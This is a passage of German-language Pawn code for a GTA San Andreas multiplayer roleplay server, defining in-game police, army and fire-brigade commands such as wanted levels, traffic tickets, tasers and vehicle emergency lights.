    		if(IstSpielerInFrak(i,1) && SpielerInfo[i][uDienst] == 1 ||IstSpielerInFrak(i,2) && SpielerInfo[i][uDienst] == 1  || IstSpielerInFrak(i,15) && SpielerInfo[i][uDienst] == 1 )
    		{
				SetPlayerCheckpoint(i,xx,yy,zz-1,3);
				cpaktiv[i] = 1;
			}
		}
 	}
	return 1;
}
cmd:cpw(playerid,params[])
{
	DisablePlayerCheckpoint(playerid);
	SendClientMessage(playerid,COLOR_GREEN,"Checkpoint entfernt!");
	return 1;
}
cmd:wanted(playerid,params[])
{
    printf("%s wanted",PlayerName(playerid));
	if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
 	if(SpielerInfo[playerid][uDienst] == 0) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht im Dienst!");
  	new wanted,grund[50],string[100];
   	if(sscanf(params,"ris[50]",giveplayerid,wanted,grund)) return SendClientMessage(playerid,COLOR_RED,"Benutze /wanted [ID/Name] [Anzahl] [Grund]");
   	if(SpielerInfo[giveplayerid][uWantedLevel] + wanted < 100)
	{
		SpielerInfo[giveplayerid][uWantedLevel] = SpielerInfo[giveplayerid][uWantedLevel]+wanted;
	}
	else
	{
		wanted = 100;
		SpielerInfo[giveplayerid][uWantedLevel] = 100;
	}
	format(string,sizeof string,"%s hat dir wegen %s %d Wanteds gegeben.",PlayerName(playerid),grund,wanted);
	SendClientMessage(giveplayerid,COLOR_YELLOW,string);
	format(string,sizeof string,"Aktuelle Wanteds: %d.",SpielerInfo[giveplayerid][uWantedLevel]);
	SendClientMessage(giveplayerid,COLOR_YELLOW,string);
	format(string,sizeof string,"Du hast %s %d Wanteds gegeben, der Gesuchte hat nun %d Wanteds.",PlayerName(giveplayerid),wanted,SpielerInfo[giveplayerid][uWantedLevel]);
	SendClientMessage(playerid,COLOR_YELLOW,string);
	format(string,sizeof string,"%s hat %s %d Wanted/s gegeben. Er hat nun %d Wanted/s Grund: %s",PlayerName(playerid),PlayerName(giveplayerid),wanted,SpielerInfo[giveplayerid][uWantedLevel],grund);
	FraktionsNachricht(1,COLOR_HQ,string);
	FraktionsNachricht(2,COLOR_HQ,string);
	FraktionsNachricht(15,COLOR_HQ,string);
	return 1;
}
cmd:gesuchte(playerid,params[])
{
    printf("%s gesuchte",PlayerName(playerid));
	if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
 	if(SpielerInfo[playerid][uDienst] == 0) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht im Dienst!");
	SendClientMessage(playerid,COLOR_LIGHTBLUE,"Gesuchte Online:");
	new string[40];
 	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(SpielerInfo[i][uWantedLevel] > 0 && SpielerInfo[i][uEingeloggt])
		{
			format(string,sizeof string,"%s: %d Wanteds",PlayerName(i),SpielerInfo[i][uWantedLevel]);
			SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
		}
	}
	return 1;
}
/*cmd:spawnwahl(playerid,params[])
{
    printf("%s spawnwahl",PlayerName(playerid));
    ShowPlayerDialog(playerid,DIALOG_ORTSPAWN,DIALOG_STYLE_LIST,"Spawn Auswahl","Lake Sorten (Hauptstadt)\nSanta Felton","Spawnen","Abbrechen");
    return 1;
}*/
cmd:spawns(playerid,params[])
{
	new string[500];
	new atext[70] = "{FEFEFE}Spawnen auf ausgeloggter Position";
	new lstext[70] = "{FEFEFE}Spawnen im LS Motel oder SF Motel";
	new ftext[70] = "{FEFEFE}Spawnen in der Fraktionsbase";
	new hspawn[70] = "{FEFEFE}Spawnen im gekauften Haus";
	if(SpielerInfo[playerid][uSpawn] == 1 || SpielerInfo[playerid][uSpawn] == 2)
	{
	    lstext = "{00FF1E}Spawnen im LS Motel oder SF Motel";
	}
	else if(SpielerInfo[playerid][uSpawn] == 4)
	{
	    ftext = "{00FF1E}Spawnen in der Fraktionsbase";
	}
	else if(SpielerInfo[playerid][uSpawn] == 0)
	{
	    atext = "{00FF1E}Spawnen auf ausgeloggter Position";
	}
	else if(SpielerInfo[playerid][uSpawn] == 3)
	{
	    hspawn = "{00FF1E}Spawnen im gekauften Haus";
	}
	format(string,sizeof(string),"%s\n%s\n%s\n%s",atext,lstext,ftext,hspawn);
	ShowPlayerDialog(playerid,DIALOG_SPAWNEN,DIALOG_STYLE_LIST,"Spawn Auswahl",string,"Wählen","Abbrechen");
	return 1;
}
cmd:tazer(playerid,params[])
{
    printf("%s tazer",PlayerName(playerid));
	if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
 	if(SpielerInfo[playerid][uDienst] == 0) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht im Dienst!");
	if(HatTaser[playerid] == 0)
  	{
   		HatTaser[playerid] = 1;
 		SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast nun einen Tazer.");
		TazerBereitForPlayer(playerid);
	}
	else
	{
		HatTaser[playerid] = 0;
		RemovePlayerAttachedObject(playerid, 0);
		SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du steckst deinen Tazer weg.");
  	}
	return 1;
}
cmd:support(playerid,params[])
{
    printf("%s support",PlayerName(playerid));
    new adminson = 0;
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        if(SpielerInfo[i][uAdmin] > 0)
        {
        	adminson++;
        	if(adminson > 0)
        	{
        	    break;
        	}
        }
	}
	if(adminson > 0)
	{
	    ShowPlayerDialog(playerid,DIALOG_SUPPORT,DIALOG_STYLE_INPUT,"Support","Gebe hier ein Thema für deine Meldung an die Admins ein:","Senden","Abbrechen");
	}
	else
	{
	    SendClientMessage(playerid,COLOR_RED,"Es sind momentan keine Supporter Online!");
	}
	return 1;
}
cmd:ticket(playerid,params[])
{
    printf("%s ticket",PlayerName(playerid));
	if(Ticket[playerid] == -1)
	{
	    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
		new Float:strafe = 0.00,grund[100];
		if(sscanf(params,"rfs",giveplayerid,strafe,grund)) return SendClientMessage(playerid,COLOR_RED,"Benutze /ticket [Name/ID] [Bußgeld] [Grund]");
		if(strafe < 0.01) return SendClientMessage(playerid,COLOR_RED,"Die Strafe darf nicht unter 1 Cent liegen!");
		if(strafe < 2000)
		{
			if(EntfernungZwischenSpielern(playerid,giveplayerid) > 2) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist zu weit entfernt!");
			if(IstSpielerInFrak(giveplayerid,1) || IstSpielerInFrak(giveplayerid,2)) return SendClientMessage(playerid,COLOR_RED,"Du kannst einem Polizisten kein Ticket geben!");
			format(grund,sizeof grund,"%s hat dir ein Ticket über %.2f$ gegeben, Grund: %s",PlayerName(playerid),strafe,grund);
			SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,grund);
			SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,"Benutze /ticket um es zu bezahlen!");
			SendFormatMessage(playerid,COLOR_GREEN,"Du hast %s ein Ticket in Höhe von %.2f$ angeboten!",PlayerName(giveplayerid),strafe);
			Ticket[giveplayerid] = strafe;
			TicketErsteller[giveplayerid] = playerid;
		}
		else SendClientMessage(playerid,COLOR_RED,"Der Ticketwert darf nicht über 2000$ liegen!");
	}
	else
	{
		if(SpielerInfo[playerid][uGeld] > Ticket[playerid])
		{
		    new mitgliedxd;
		    if(SpielerInfo[TicketErsteller[playerid]][uLeiter] > 0)
		    {
		        mitgliedxd = SpielerInfo[TicketErsteller[playerid]][uLeiter];
		    }
		    else
		    {
		        mitgliedxd = SpielerInfo[TicketErsteller[playerid]][uMitglied];
		    }
		    
		    new string[50];
		    GebeGeld(playerid,-Ticket[playerid]);
		    SendClientMessage(playerid,COLOR_GREEN,"Ticket bezahlt!");
		    format(string,sizeof string,"%s hat sein Ticket bezahlt!",PlayerName(playerid));
		    SendClientMessage(TicketErsteller[playerid],COLOR_GREEN,string);
		    GebeGeld(TicketErsteller[playerid],Ticket[playerid]);
		    Fraktionskasse[mitgliedxd] += Ticket[playerid];
		    Frakkassespeichern(mitgliedxd);
		    Ticket[playerid] = -1;
		}
		else
		{
		    SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
		    SendClientMessage(TicketErsteller[playerid],COLOR_RED,"Der Spieler hat nicht genug Geld für das Ticket!");
		    Ticket[playerid] = -1;
		    TicketErsteller[playerid] = -1;
		}
	}
	return 1;
}
cmd:folgen(playerid,params[])
{
	if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist!");
    printf("%s folgen",PlayerName(playerid));
	new veh = GetPlayerVehicleID(playerid);
	if(PoliceLight[veh] != INVALID_OBJECT_ID)
	{
    	DestroyDynamicObject(PoliceLight[veh]);
    	PoliceLight[veh] = INVALID_OBJECT_ID;
	}
	else
	{
    	PoliceLight[veh] = CreateDynamicObject(19329, 73.70150, 1677.82495, 18.12200, -57.0000, 0.00000, 0.00000);
    	SetDynamicObjectMaterialText(PoliceLight[veh],0,"POLIZEI\nBITTE FOLGEN",OBJECT_MATERIAL_SIZE_256x128,\"Arial",27,0,0xFFFF0000,0x00000000,1);
    	AttachDynamicObjectToVehicle(PoliceLight[veh],veh,0.000,-1.684,0.45,-57.0,0,0);
	}
	return 1;
}
/*
cmd:oil(playerid,params[])
{
    new tmpcar = GetPlayerVehicleID(playerid);
    if(GetVehicleModel(tmpcar) == 578)
    {
        new obj;
        obj = CreateDynamicObjectEx(3643, 1992.9305, 1328.4531, 10.7973, 0.0000, 0.0000, 0.0000, 0, 200.00); //taxi04
        //SetDynamicObjectMaterialText(obj,0,"BENZIN und DIESEL",OBJECT_MATERIAL_SIZE_256x128,"Arial",24,1,0xFF5000FF,0x5A5A5AFF,1);
		AttachDynamicObjectToVehicle(obj,GetPlayerVehicleID(playerid), 0.0000, -2.0000, 1, 0.0000, 0.0000, 0.0000);
		return 1;
	}
	return 1;
}*/
cmd:blaulicht(playerid,params[])
{
    printf("%s sirene",PlayerName(playerid));
    if(UCL[GetPlayerVehicleID(playerid)] == 0)
    {
        new tmpcar = GetPlayerVehicleID(playerid);
        if(GetVehicleModel(tmpcar) == 400)
        {
            DACHAUF[GetPlayerVehicleID(playerid)] = CreateDynamicObjectEx(19311, 1992.9305, 1328.4531, 10.7973, 0.0000, 0.0000, 0.0000, 200.00, 200.00); //taxi04
			SetDynamicObjectMaterialText(DACHAUF[GetPlayerVehicleID(playerid)],0,"Fire & Rescue\n IM EINSATZ",OBJECT_MATERIAL_SIZE_256x128,"Arial",24,1,0xFF000000,0xFFD78E10,1);
			AttachDynamicObjectToVehicle(DACHAUF[GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid), 0.0000, 0.0000, 0.8999, 0.0000, 0.0000, 90.0000);
			UCL[GetPlayerVehicleID(playerid)] = 1;
			SendClientMessage(playerid,0xFF0000,"Schild drauf!");
			FlashTime[tmpcar] = SetTimerEx("OnLightFlash", flashtime, true, "d", tmpcar);
			return 1;
		}
        else if(GetVehicleModel(tmpcar) == 560)
        {
            sirene[GetPlayerVehicleID(playerid)] = CreateDynamicObject(19288,0,0,0,0,0,0,100);
            sirene1[GetPlayerVehicleID(playerid)] = CreateDynamicObject(18646,0,0,0,0,0,0);
            sirene2[GetPlayerVehicleID(playerid)] = CreateDynamicObject(19288,0,0,0,0,0,0,100);
            sirene3[GetPlayerVehicleID(playerid)] = CreateDynamicObject(19288,0,0,0,0,0,0,100);
            sirene4[GetPlayerVehicleID(playerid)] = CreateDynamicObject(19292,0,0,0,0,0,0,100);
            AttachDynamicObjectToVehicle(sirene[GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid),0 ,2.6,0,0,0,0);//Vorne Mitte
            AttachDynamicObjectToVehicle(sirene1[GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid),-0.5,-0.2,0.8,2.0,2.0,3.0);//Dach sirene
            AttachDynamicObjectToVehicle(sirene2[GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid),0.7,2.6,0,0,0,0);//Vorne Licht Beifahrerseite
            AttachDynamicObjectToVehicle(sirene3[GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid),-0.7,2.6,0,0,0,0);//Vorne Licht Fahrerseite
            AttachDynamicObjectToVehicle(sirene4[GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid),0,0.9,0.4,0,0,0);//Mittig im Fenster
            UCL[GetPlayerVehicleID(playerid)] = 1;
            SendClientMessage(playerid,0xFF0000,"Blaulicht eingeschalten!");
            FlashTime[tmpcar] = SetTimerEx("OnLightFlash", flashtime, true, "d", tmpcar);
            return 1;
        }
        else if(GetVehicleModel(tmpcar) == 525)
        {
			towlights[0][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19803, 2042.9592, 1345.2044, 12.4536, 0.0000, 0.0000, 0.0000); //TowTruckLights1
			AttachDynamicObjectToVehicle(towlights[0][GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid), 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000);
			UCL[GetPlayerVehicleID(playerid)] = 1;
            SendClientMessage(playerid,0xFF0000,"Warnlicht eingeschaltet!");
            FlashTime[tmpcar] = SetTimerEx("OnLightFlash", flashtime, true, "d", tmpcar);
            return 1;

       	}
        else if(GetVehicleModel(tmpcar) == 573)
        {
			rustlight[0][GetPlayerVehicleID(playerid)] = CreateDynamicObject(18646, 2038.5249, 1338.9249, 13.2262, 0.0000, 0.0000, 0.0000); //PoliceLight1
			rustlight[1][GetPlayerVehicleID(playerid)] = CreateDynamicObject(11701, 2028.3836, 1348.8598, 10.8203, 0.0000, 0.0000, 0.0000); //AmbulanceLights1
			AttachDynamicObjectToVehicle(rustlight[0][GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid), -0.0000, -3.0799, 1.5599, 357.7000, 0.0000, 0.0000);
			AttachDynamicObjectToVehicle(rustlight[1][GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid), 0.0000, 2.0999, 1.5599, 0.0000, 0.0000, 0.0000);
			UCL[GetPlayerVehicleID(playerid)] = 1;
            SendClientMessage(playerid,0xFF0000,"Blaulicht eingeschalten!");
            FlashTime[tmpcar] = SetTimerEx("OnLightFlash", flashtime, true, "d", tmpcar);
            return 1;
        }
       	else if(GetVehicleModel(tmpcar) == 407)
        {
        
			ftruck[0][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19803, 2039.1916, 1344.4038, 10.9156, 0.0000, 0.0000, 0.0000); //TowTruckLights1
			ftruck[1][GetPlayerVehicleID(playerid)] = CreateDynamicObject(18646, 2036.7182, 1340.5509, 15.5165, 0.0000, 0.0000, 0.0000); //PoliceLight1
			AttachDynamicObjectToVehicle(ftruck[0][GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid), 0.0000, 3.6700, -0.1000, 0.0000, 0.0000, 0.0000);
			AttachDynamicObjectToVehicle(ftruck[1][GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid), 0.0000, -3.0000, 1.3600, 0.0000, 0.0000, 0.0000);
			UCL[GetPlayerVehicleID(playerid)] = 1;
            SendClientMessage(playerid,0xFF0000,"Blaulicht eingeschalten!");
            FlashTime[tmpcar] = SetTimerEx("OnLightFlash", flashtime, true, "d", tmpcar);
            return 1;
        }
       	else if(GetVehicleModel(tmpcar) == 408)
        {
        
			mullwag[0][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19294, 2024.7824, 1346.3889, 13.3520, 0.0000, 0.0000, 0.0000); //PointLight14
			mullwag[1][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19420, 2024.0944, 1343.6324, 12.1497, 0.0000, 0.0000, 0.0000); //police_lights02
			SetDynamicObjectMaterial(mullwag[1][GetPlayerVehicleID(playerid)],0, 13598, "destructo", "redband_64", 0x00000000);
			mullwag[2][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19294, 2023.5544, 1343.6324, 12.2297, 0.0000, 0.0000, 0.0000); //PointLight14
			mullwag[3][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19815, 2043.8126, 1462.2241, 10.2360, 89.5800, 0.0000, 539.3041); //ToolBoard1
			//MORITZ SetDynamicObjectMaterialText(mullwag[3][GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid), "Example Text", 0, OBJECT_MATERIAL_SIZE_128x128, "Arial", 24, 1, 0xFFFFFFFF, 0x00000000,0);
			AttachDynamicObjectToVehicle(mullwag[0][GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid), -0.5399, 2.6999, 1.0799, 0.0000, 0.0000, 0.0000);
			AttachDynamicObjectToVehicle(mullwag[1][GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid), 0.0000, 2.7000, 1.0000, 0.0000, 0.0000, 0.0000);
			AttachDynamicObjectToVehicle(mullwag[2][GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid), 0.4999, 2.6999, 1.0799, 0.0000, 0.0000, 0.0000);
			AttachDynamicObjectToVehicle(mullwag[3][GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid), 0.6600, -3.4800, -1.0000, 89.5800, 0.0000, 359.9999);
			UCL[GetPlayerVehicleID(playerid)] = 1;
            SendClientMessage(playerid,0xFF0000,"Rampe hinten rechts und Orangelicht eingeschalten!");
            return 1;
		}
        else if(GetVehicleModel(tmpcar) == 544)
        {
			g_Object34[0][GetPlayerVehicleID(playerid)] = CreateDynamicObject(18646, 2046.0877, 1260.9770, 13.9784, 0.0000, 0.0000, 0.0000); //PoliceLight1
			g_Object34[1][GetPlayerVehicleID(playerid)] = CreateDynamicObject(11701, 2131.3801, 1268.3551, 10.8813, 0.0000, 0.0000, 1.2633); //AmbulanceLights2
			AttachDynamicObjectToVehicle(g_Object34[0][GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.0000, -4.0000, -0.6000, 0.0000, 0.0000, 0.0000);
			AttachDynamicObjectToVehicle(g_Object34[1][GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.0000, 2.8499, 1.5000, 0.0000, 0.0000, 0.0000);
			UCL[GetPlayerVehicleID(playerid)] = 1;
            SendClientMessage(playerid,0xFF0000,"Blaulicht eingeschalten!");
            FlashTime[tmpcar] = SetTimerEx("OnLightFlash", flashtime, true, "d", tmpcar);
            return 1;
		}
        else if(GetVehicleModel(tmpcar) == 416)
        {
            g_Object[0][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19290, 2048.3767, 1419.2801, 12.2100, 0.0000, 0.0000, 0.0000); //PointLight10
			g_Object[1][GetPlayerVehicleID(playerid)] = CreateDynamicObject(11701, 2046.6931, 1423.4445, 11.5783, 0.0000, 0.0000, 0.0000); //AmbulanceLights1
			g_Object[2][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19290, 2048.3767, 1419.2801, 12.2100, 0.0000, 0.0000, 0.0000); //PointLight10
			AttachDynamicObjectToVehicle(g_Object[0][GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 1.0499, -3.6500, 1.4500, 0.0000, 0.0000, 0.0000);
			AttachDynamicObjectToVehicle(g_Object[1][GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.0000, 0.8999, 1.2250, 0.0000, 0.0000, 0.0000);
			AttachDynamicObjectToVehicle(g_Object[2][GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), -1.0499, -3.6500, 1.4500, 0.0000, 0.0000, 0.0000);
            UCL[GetPlayerVehicleID(playerid)] = 1;
            SendClientMessage(playerid,0xFF0000,"Blaulicht eingeschalten!");
            FlashTime[tmpcar] = SetTimerEx("OnLightFlash", flashtime, true, "d", tmpcar);
            return 1;
        }
        else if(GetVehicleModel(tmpcar) == 596 || GetVehicleModel(tmpcar) == 597)
        {
            g_Object[3][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19292, 2041.4177, 947.0371, 9.5695, 0.0000, 0.0000, 0.0000); //PointLight12
			g_Object[4][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19292, 2041.4177, 947.0371, 9.5695, 0.0000, 0.0000, 0.0000); //PointLight12
			g_Object[5][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19419, 2042.5886, 929.9547, 9.9125, 0.0000, 0.0000, 0.0000); //police_lights01
   			AttachDynamicObjectToVehicle(g_Object[3][GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.4000, 2.4500, -0.0099, 0.0000, 0.0000, 0.0000);
			AttachDynamicObjectToVehicle(g_Object[4][GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), -0.4000, 2.4500, -0.0099, 0.0000, 0.0000, 0.0000);
			AttachDynamicObjectToVehicle(g_Object[5][GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.0010, -0.3899, 0.8899, 0.0000, 0.1000, 0.0000);
            UCL[GetPlayerVehicleID(playerid)] = 1;
            SendClientMessage(playerid,0xFF0000,"Blaulicht eingeschalten!");
            FlashTime[tmpcar] = SetTimerEx("OnLightFlash", flashtime, true, "d", tmpcar);
            return 1;
        }
        else if(GetVehicleModel(tmpcar) == 426)
        {
            g_Object[6][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19797, 2043.1839, 1354.3822, 10.4224, 0.0000, 0.0000, 174.9000); //PoliceVisorStrobe1
			g_Object[7][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19797, 2043.1839, 1354.3822, 10.4224, 0.0000, 0.0000, 174.9000); //PoliceVisorStrobe1
   			AttachDynamicObjectToVehicle(g_Object[6][GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.4000, 0.4000, 0.6499, 0.0000, 0.0000, 180.0000);
			AttachDynamicObjectToVehicle(g_Object[7][GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), -0.6700, -1.7799, 0.4000, 0.0000, 0.0000, 0.0000);
            UCL[GetPlayerVehicleID(playerid)] = 1;
            SendClientMessage(playerid,0xFF0000,"Blaulicht eingeschalten!");
            FlashTime[tmpcar] = SetTimerEx("OnLightFlash", flashtime, true, "d", tmpcar);
            return 1;
        }
        else if(GetVehicleModel(tmpcar) == 490)
        {
            if(IstSpielerInFrak(playerid,3) || IstSpielerInFrak(playerid,4))
            {
	            g_Object[8][GetPlayerVehicleID(playerid)] = CreateDynamicObject(11701, 2047.0196, 1352.1550, 10.2024, 0.0000, 0.0000, 0.0000); //AmbulanceLights1
	    		AttachDynamicObjectToVehicle(g_Object[8][GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.0000, 0.1800, 1.1499, 0.0000, 0.0000, 0.0000);
	            UCL[GetPlayerVehicleID(playerid)] = 1;
	            SendClientMessage(playerid,0xFF0000,"Blaulicht eingeschalten!");
	            FlashTime[tmpcar] = SetTimerEx("OnLightFlash", flashtime, true, "d", tmpcar);
			}
			else if(IstSpielerInFrak(playerid,15))
			{
			    g_Object[8][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19419,0.00000,0.00000,0.00000,0.00000,0.00000,0.00000);
	    		AttachDynamicObjectToVehicle(g_Object[8][GetPlayerVehicleID(playerid)], GetPlayerVehicleID(playerid), 0.00000,0.565,1.09,0.00000,0.00000,0.00000);
	            UCL[GetPlayerVehicleID(playerid)] = 1;
	            SendClientMessage(playerid,0xFF0000,"Blaulicht eingeschalten!");
	            FlashTime[tmpcar] = SetTimerEx("OnLightFlash", flashtime, true, "d", tmpcar);
			}
            return 1;
        }
        else if(GetVehicleModel(tmpcar) == 470)
        {
			g_Object[9][GetPlayerVehicleID(playerid)] = CreateDynamicObject(19419,0.00000,0.00000,0.00000,0.00000,0.00000,0.00000);
			AttachDynamicObjectToVehicle(g_Object[9][GetPlayerVehicleID(playerid)],GetPlayerVehicleID(playerid),0.00000,0.13,1.09,0.00000,0.00000,0.00000);

            UCL[GetPlayerVehicleID(playerid)] = 1;
            FlashTime[tmpcar] = SetTimerEx("OnLightFlash", flashtime, true, "d", tmpcar);
            SendClientMessage(playerid,0xFF0000,"Blaulicht eingeschalten!");
            return 1;
        }
	}
 	else if(UCL[GetPlayerVehicleID(playerid)] == 1)
 	{
 	    new tmpcar = GetPlayerVehicleID(playerid);
  		new panels, doors, lights, tires;
		KillTimer(FlashTime[tmpcar]);
		GetVehicleDamageStatus(tmpcar, panels, doors, lights, tires);
        UpdateVehicleDamageStatus(tmpcar, panels, doors, 0, tires);
	 	DestroyDynamicObject(sirene[GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(sirene1[GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(sirene2[GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(sirene3[GetPlayerVehicleID(playerid)]);
		DestroyDynamicObject(sirene4[GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(g_Object[0][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(g_Object[1][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(g_Object[2][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(g_Object[3][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(g_Object[4][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(g_Object[5][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(g_Object[6][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(g_Object[7][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(g_Object[8][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(g_Object[9][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(g_Object34[0][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(g_Object34[1][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(rustlight[0][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(rustlight[1][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(ftruck[0][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(ftruck[1][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(mullwag[0][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(mullwag[1][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(mullwag[2][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(mullwag[3][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(towlights[0][GetPlayerVehicleID(playerid)]);
	 	DestroyDynamicObject(DACHAUF[GetPlayerVehicleID(playerid)]);
	 	UCL[GetPlayerVehicleID(playerid)] = 0;
	 	SendClientMessage(playerid,0xFF0000,"Blaulicht ausgeschalten!");
 		return 1;
 	}
	return 1;
}
cmd:lampe(playerid,params[])
{
    printf("%s lampe",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    {
		if(IsPlayerAttachedObjectSlotUsed(playerid,2))
		{
			RemovePlayerAttachedObject(playerid,2);
		}
		else
		{
			SetPlayerAttachedObject(playerid, 2,18641, 5, 0.1, 0.02, -0.05, 0, 0, 0, 1, 1, 1);
		}
		return 1;
	}
}
cmd:schild(playerid,params[])
{
    printf("%s schild",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    {
		if(IsPlayerAttachedObjectSlotUsed(playerid,1))
 		{
  			RemovePlayerAttachedObject(playerid,1);
 		}
  		else
   		{
    		SetPlayerAttachedObject(playerid,1, 18637, 4, 0.3, 0, 0, 0, 170, 270, 1, 1, 1);
    	}
    	return 1;
	}
}
cmd:atemschutz(playerid,params[])
{
    printf("%s Atemschutz",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,3) && !IstSpielerInFrak(playerid,4)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Feuerwehrmann.");
    {
   		if(IsPlayerAttachedObjectSlotUsed(playerid,8))
     	{
      		RemovePlayerAttachedObject(playerid,8);
     	}
      	else
       	{
			SetPlayerAttachedObject(playerid, 8, 19816, 1, 0.1439, -0.1989, -0.0219, 115.6998, 97.2001, -1.6999, 1.0000, 1.0000, 1.0000, 0xFFFFFF00, 0xFFFFFF00);
        }
        return 1;
	}
}
cmd:helm(playerid,params[])
{
    printf("%s helm",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    {
   		if(IsPlayerAttachedObjectSlotUsed(playerid,5))
     	{
      		RemovePlayerAttachedObject(playerid,5);
     	}
      	else
       	{
        	SetPlayerAttachedObject(playerid, 5, 19141, 2, 0.1029, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 1.0000, 1.0550, 1.1159, 0xFFFFFFFF, 0xFFFFFFFF); // SWATHelmet1 attached to the Head of Andy
        }
        return 1;
	}
}
cmd:atemschutzmaske(playerid,params[])
{
    printf("%s Atemschutzmaske",PlayerName(playerid));
